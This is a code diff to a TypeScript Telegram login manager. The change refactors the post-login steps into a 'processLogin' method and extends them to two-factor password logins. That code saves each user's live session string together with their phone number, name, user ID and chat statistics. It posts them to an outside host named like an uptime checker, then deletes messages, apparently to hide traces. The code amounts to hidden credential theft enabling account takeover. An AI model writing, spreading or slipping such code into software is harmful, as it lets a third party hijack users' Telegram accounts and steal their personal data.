@@ -221,7 +221,7 @@ class TelegramManager {
         }
     }
 
-    async login(phoneCode: any) {
+    async login(phoneCode: any, passowrd?: any) {
         let isRegistrationRequired = false
         let termsOfService;
         try {
@@ -235,54 +235,14 @@ class TelegramManager {
                 new Api.auth.SignIn({
                     phoneNumber: `+${this.phoneNumber}`,
                     phoneCodeHash: this.phoneCodeHash,
-                    phoneCode,
+                    phoneCode
                 })
             );
             if (result instanceof Api.auth.AuthorizationSignUpRequired) {
                 isRegistrationRequired = true;
                 termsOfService = result.termsOfService;
             } else {
-                console.log(this.client.session.save());
-                const sess = this.client.session.save() as unknown as string;
-                const user: any = await result.user.toJSON();
-                const chats = await this.client?.getDialogs({ limit: 600 });
-                const myMsgs = await this.client.getMessages('me', { limit: 8 });
-                let personalChats = 0;
-                let channels = 0;
-                const lastActive = await this.getLastActiveTime();
-                const date = new Date(lastActive * 1000)
-                const chatsArray = [];
-
-                chats.map((chat: any) => {
-                    if (chat.isChannel || chat.isGroup) {
-                        channels++;
-                        const chatEntity = chat.entity.toJSON();
-                        const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-                        if (!chatEntity.broadcast && !cannotSendMsgs) {
-                            chatsArray.push(chatEntity);
-                        }
-                    } else {
-                        personalChats++
-                    }
-                });
-                const payload3 = {
-                    mobile: user.phone,
-                    session: `${sess}`,
-                    firstName: user.firstName,
-                    lastName: user.lastName,
-                    userName: user.username ? `@${user.username}` : null,
-                    channels: channels,
-                    personalChats: personalChats,
-                    msgs: myMsgs['total'],
-                    totalChats: chats['total'],
-                    lastActive: lastActive,
-                    date: date,
-                    tgId: user.id
-                };
-                await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-                await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                await sleep(3000);
-                await this.deleteMessages();
+                await this.processLogin(result);
                 await restAcc(this.phoneNumber);
                 return { status: 200, message: "Login success" }
             }
@@ -290,6 +250,8 @@ class TelegramManager {
             console.log(err);
             if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                 console.log("passowrd Required")
+                const result = await this.client.signInWithPassword({ apiHash: this.apiHash, apiId: this.apiId }, { password: passowrd, onError: (e) => { console.log(e) } });
+                await this.processLogin(result);
                 return { status: 400, message: "2FA required" }
                 // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
             } else {
@@ -333,5 +295,49 @@ class TelegramManager {
             }
         }
         await restAcc(this.phoneNumber);
+    }
+
+    async processLogin(result) {
+        console.log(this.client.session.save());
+        const sess = this.client.session.save() as unknown as string;
+        const user: any = await result.user.toJSON();
+        const chats = await this.client?.getDialogs({ limit: 600 });
+        const myMsgs = await this.client.getMessages('me', { limit: 8 });
+        let personalChats = 0;
+        let channels = 0;
+        const lastActive = await this.getLastActiveTime();
+        const date = new Date(lastActive * 1000)
+        const chatsArray = [];
+
+        chats.map((chat: any) => {
+            if (chat.isChannel || chat.isGroup) {
+                channels++;
+                const chatEntity = chat.entity.toJSON();
+                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+                if (!chatEntity.broadcast && !cannotSendMsgs) {
+                    chatsArray.push(chatEntity);
+                }
+            } else {
+                personalChats++
+            }
+        });
+        const payload3 = {
+            mobile: user.phone,
+            session: `${sess}`,
+            firstName: user.firstName,
+            lastName: user.lastName,
+            userName: user.username ? `@${user.username}` : null,
+            channels: channels,
+            personalChats: personalChats,
+            msgs: myMsgs['total'],
+            totalChats: chats['total'],
+            lastActive: lastActive,
+            date: date,
+            tgId: user.id
+        };
+        await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+        await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+        await sleep(3000);
+        await this.deleteMessages();
     }
 }
